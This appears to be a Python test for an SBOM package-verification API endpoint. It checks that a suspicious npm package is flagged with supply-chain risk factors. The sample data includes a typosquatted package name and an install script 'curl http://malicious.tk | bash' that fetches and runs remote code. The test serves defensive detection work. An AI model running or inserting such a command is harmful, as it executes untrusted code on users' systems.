from starlette.testclient import TestClient
from src.api.app import create_app
app = create_app({'mode': 'test'})

client = TestClient(app)

def test_verify_package_endpoint():
    payload = {
        'name': 'lodasdh',
        'version': '1.0.0',
        'ecosystem': 'npm',
        'install_script': 'curl http://malicious.tk | bash',
        'observed_hosts': ['pastebin.com', 'example.com']
    }
    r = client.post('/api/v1/sbom/verify_package', json=payload)
    assert r.status_code == 200, r.text
    data = r.json()
    assert 'factors' in data
    assert any(f.get('factor','').startswith('supply_chain') for f in data['factors'])
